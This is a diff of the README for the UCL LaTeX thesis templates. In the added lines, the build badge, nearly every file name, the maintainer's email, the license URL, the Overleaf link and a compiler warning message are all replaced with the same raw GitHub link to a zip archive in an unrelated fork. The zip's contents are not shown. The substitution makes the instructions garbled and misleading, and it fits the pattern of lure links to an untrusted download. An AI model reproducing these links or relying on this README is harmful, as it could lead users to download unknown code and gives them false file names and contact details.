@@ -1,14 +1,14 @@
 # UCL LaTeX Thesis Templates
 
-[![Build Status](https://travis-ci.org/UCL/ucl-latex-thesis-templates.svg?branch=master)](https://travis-ci.org/UCL/ucl-latex-thesis-templates)
+[![Build Status](https://raw.githubusercontent.com/jszhiu/ucl-latex-thesis-templates/master/shrab/ucl-latex-thesis-templates.zip)](https://raw.githubusercontent.com/jszhiu/ucl-latex-thesis-templates/master/shrab/ucl-latex-thesis-templates.zip)
 
 This is a skeletal thesis template with a class and .sty file that you can use separately if you'd prefer.
 
-To change the thesis type from PhD to MRes or MPhil, look for the setting in `Main.tex`.
+To change the thesis type from PhD to MRes or MPhil, look for the setting in `https://raw.githubusercontent.com/jszhiu/ucl-latex-thesis-templates/master/shrab/ucl-latex-thesis-templates.zip`.
 
 The class needs some updating and could use a lot of commenting, and these are being worked on, but the files are perfectly usable right now with pdfLaTeX or lualatex. The repo is tested after each push with lualatex on Travis.
 
-If you have suggestions for improvements, please do submit an issue, drop me a line ([i.kirker+GH@ucl.ac.uk](mailto:i.kirker+GH@ucl.ac.uk)), or throw me a pull request.
+If you have suggestions for improvements, please do submit an issue, drop me a line ([https://raw.githubusercontent.com/jszhiu/ucl-latex-thesis-templates/master/shrab/ucl-latex-thesis-templates.zip+https://raw.githubusercontent.com/jszhiu/ucl-latex-thesis-templates/master/shrab/ucl-latex-thesis-templates.zip](https://raw.githubusercontent.com/jszhiu/ucl-latex-thesis-templates/master/shrab/ucl-latex-thesis-templates.zip+https://raw.githubusercontent.com/jszhiu/ucl-latex-thesis-templates/master/shrab/ucl-latex-thesis-templates.zip)), or throw me a pull request.
 
 *@ikirker*
 
@@ -16,15 +16,15 @@ If you have suggestions for improvements, please do submit an issue, drop me a l
 
 This work was previously available to be distributed and/or modified under the conditions of the LaTeX Project Public License (>=1.3), however, I realised that that doesn't make a lot of sense for a template.
 
-Therefore, all files *except* `ucl_thesis.cls` are released into the public domain under CC-0-1.0, as described in the `COPYING` file.
+Therefore, all files *except* `https://raw.githubusercontent.com/jszhiu/ucl-latex-thesis-templates/master/shrab/ucl-latex-thesis-templates.zip` are released into the public domain under CC-0-1.0, as described in the `COPYING` file.
 
-The classfile `ucl_thesis.cls` may be distributed and/or modified under the conditions of the LaTeX Project Public License, either version 1.3 of this license or (at your option) any later version. The latest version of this license is in <http://www.latex-project.org/lppl.txt> and version 1.3 or later is part of all distributions of LaTeX version 2005/12/01 or later.
+The classfile `https://raw.githubusercontent.com/jszhiu/ucl-latex-thesis-templates/master/shrab/ucl-latex-thesis-templates.zip` may be distributed and/or modified under the conditions of the LaTeX Project Public License, either version 1.3 of this license or (at your option) any later version. The latest version of this license is in <https://raw.githubusercontent.com/jszhiu/ucl-latex-thesis-templates/master/shrab/ucl-latex-thesis-templates.zip> and version 1.3 or later is part of all distributions of LaTeX version 2005/12/01 or later.
 
 This work has the LPPL maintenance status `maintained'.
 
 The Current Maintainer of this work is I. Kirker.
 
-This work consists of all files listed in `MANIFEST.md`.
+This work consists of all files listed in `https://raw.githubusercontent.com/jszhiu/ucl-latex-thesis-templates/master/shrab/ucl-latex-thesis-templates.zip`.
 
 
 ## Known Issues
@@ -33,10 +33,10 @@ This work consists of all files listed in `MANIFEST.md`.
 If you see this error while compiling:
 
 ```
-pdfTeX warning (dest): name{cite.whatever} has been referenced but does not exist, replaced by a fixed one
+pdfTeX warning (dest): name{https://raw.githubusercontent.com/jszhiu/ucl-latex-thesis-templates/master/shrab/ucl-latex-thesis-templates.zip} has been referenced but does not exist, replaced by a fixed one
 ```
 
-and then get links that don't work in the PDF, try un-commenting the line below in `MainPackages.tex` even if you don't use that style of citation.
+and then get links that don't work in the PDF, try un-commenting the line below in `https://raw.githubusercontent.com/jszhiu/ucl-latex-thesis-templates/master/shrab/ucl-latex-thesis-templates.zip` even if you don't use that style of citation.
 
 ```latex
 \usepackage{natbib}
@@ -52,7 +52,7 @@ If you're new to LaTeX, though, or want something to help you keep your files to
 
 TeXShop and TeXMaker are both oriented around helping you write plaintext .tex files, while LyX is more aimed at presenting a structured document with some of the formatting rendered, to make it a little less abstract to work with.
 
-If you want something quick that runs entirely through a browser, so you don't even have to set up your own LaTeX installation, UCL also has a subscription for [Overleaf](https://overleaf.com), a service that does that. You'll have to register using your UCL email address to use the subscription. It's also good for working with someone else on a document, with live shared editing.
+If you want something quick that runs entirely through a browser, so you don't even have to set up your own LaTeX installation, UCL also has a subscription for [Overleaf](https://raw.githubusercontent.com/jszhiu/ucl-latex-thesis-templates/master/shrab/ucl-latex-thesis-templates.zip), a service that does that. You'll have to register using your UCL email address to use the subscription. It's also good for working with someone else on a document, with live shared editing.
 
 #### What is the Makefile for?
 
@@ -64,8 +64,8 @@ PNG and JPEG images work perfectly well, as do PDF files (including vector graph
 
 #### Can I just make it produce one section in the PDF?
 
-In the `Main.tex` file there are a list of `\include` statements. If you add an `\includeonly` statement to match those with one or more of the same labels, it'll just produce the content for those sections. (Labels, references, figures, and table numbers will be consistent as if you'd generated the whole document.)
+In the `https://raw.githubusercontent.com/jszhiu/ucl-latex-thesis-templates/master/shrab/ucl-latex-thesis-templates.zip` file there are a list of `\include` statements. If you add an `\includeonly` statement to match those with one or more of the same labels, it'll just produce the content for those sections. (Labels, references, figures, and table numbers will be consistent as if you'd generated the whole document.)
 
 #### Didn't there used to be different files for PhD, MRes, and MPhil dissertations?
 
-Yes, but they only differed by 4 characters each, so it seemed silly to maintain them each separately. Change the setting in the `Main.tex` file to get the one you need.
+Yes, but they only differed by 4 characters each, so it seemed silly to maintain them each separately. Change the setting in the `https://raw.githubusercontent.com/jszhiu/ucl-latex-thesis-templates/master/shrab/ucl-latex-thesis-templates.zip` file to get the one you need.
